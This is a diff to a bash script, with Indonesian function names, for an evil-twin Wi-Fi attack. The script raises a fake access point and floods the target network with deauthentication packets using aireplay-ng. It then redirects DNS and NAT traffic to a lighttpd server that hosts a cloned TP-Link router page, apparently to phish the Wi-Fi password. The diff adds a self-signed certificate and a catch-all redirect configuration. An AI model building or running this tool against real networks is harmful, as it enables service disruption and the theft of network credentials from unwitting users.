@@ -36,8 +36,8 @@ function hancur {
          -p udp -m udp --dport 53 -j REDIRECT --to-ports 5353 || die
          
     airmon-ng stop mon0
-    airmon-ng stop wlp9s0
-    iwconfig
+    killall lighttpd
+    clear
 }
 function serang {
 
@@ -51,17 +51,19 @@ function serang {
    read BSSID
    echo ""
    
-   xterm $BOTTOMLEFT -bg "#000000" -fg "#99CCFF" -title "WIFI palsu" -e create_ap wlp9s0 wlp9s0 "$WIFI" &
+   xterm $BOTTOMLEFT -bg "#000000" -fg "#00aa00" -title "WIFI palsu" -e create_ap wlp9s0 wlp9s0 "$WIFI" &
    xterm $HOLD $BOTTOMRIGHT -bg "#000000" -fg "#FF0009" -title "Deauth all" -e aireplay-ng -0 0 -a $BSSID --ignore-negative-one mon0 &
- 
+   xterm -title "Create Self-Signed SSL Certificate" -e openssl req -subj '/CN=SEGURO/O=SEGURA/OU=SEGURA/C=US' -new -newkey rsa:2048 -days 365 -nodes -x509 -keyout /$DUMP_PATH/server.pem -out /$DUMP_PATH/server.pem &
+   xterm &
    sleep 10 &&
    
    xterm $BOTTOMLEFT -bg "#000000" -fg "#99CCFF" -title "FAKEDNS" -e "if type python2 >/dev/null 2>/dev/null; then python2 $DUMP_PATH/fakedns; else python $DUMP_PATH/fakedns; fi" &
     
    sleep 17 &&
    router &&
-   
-   xterm -bg "#000000" -fg "#00aa00" -title "SERVER http" -e php -t /home/shun/hack/sites/tplink -S 192.168.12.1:80
+   killall lighttpd
+   lighttpd -f $DUMP_PATH/lighttpd.conf
+  #xterm -bg "#000000" -fg "#00aa00" -title "SERVER http" -e php -t /home/shun/hack/sites/tplink -S 192.168.12.1:80
 
 }
 
@@ -78,7 +80,7 @@ function router {
   iptables -A INPUT -p tcp --sport 443 -j ACCEPT
   iptables -A OUTPUT -p tcp --dport 443 -j ACCEPT
   iptables -t nat -A POSTROUTING -j MASQUERADE
-
+   
 }
 
 function buatfakedns {
@@ -128,7 +130,61 @@ if __name__ == '__main__':
         chmod +x $DUMP_PATH/fakedns
 }
 
+function buatserver {
+	  echo "server.document-root = \"/home/shun/hack/sites/tplink/\"
+
+  server.modules = (
+    \"mod_access\",
+    \"mod_alias\",
+    \"mod_accesslog\",
+    \"mod_fastcgi\",
+    \"mod_redirect\",
+    \"mod_rewrite\"
+  )
+
+  fastcgi.server = ( \".php\" => ((
+                  \"bin-path\" => \"/usr/bin/php-cgi\",
+                  \"socket\" => \"/php.socket\"
+                )))
+
+  server.port = 80
+  server.pid-file = \"/var/run/lighttpd.pid\"
+  # server.username = \"www\"
+  # server.groupname = \"www\"
+
+  mimetype.assign = (
+  \".html\" => \"text/html\",
+  \".htm\" => \"text/html\",
+  \".txt\" => \"text/plain\",
+  \".jpg\" => \"image/jpeg\",
+  \".png\" => \"image/png\",
+  \".css\" => \"text/css\"
+  )
+
+
+  server.error-handler-404 = \"/\"
+
+  static-file.exclude-extensions = ( \".fcgi\", \".php\", \".rb\", \"~\", \".inc\" )
+  index-file.names = ( \"index.htm\", \"index.html\" )
+
+  \$SERVER[\"socket\"] == \":443\" {
+        url.redirect = ( \"^/(.*)\" => \"http://www.router.com\")
+        ssl.engine                  = \"enable\"
+        ssl.pemfile                 = \"$DUMP_PATH/server.pem\"
+
+  }
+
+  #Redirect www.domain.com to domain.com
+  \$HTTP[\"host\"] =~ \"^www\.(.*)$\" {
+        url.redirect = ( \"^/(.*)\" => \"http://%1/\$1\" )
+        ssl.engine                  = \"enable\"
+        ssl.pemfile                 = \"$DUMP_PATH/server.pem\"
+  }
+  " >$DUMP_PATH/lighttpd.conf
+}
+
 buatfakedns
+buatserver
 
 serang
 
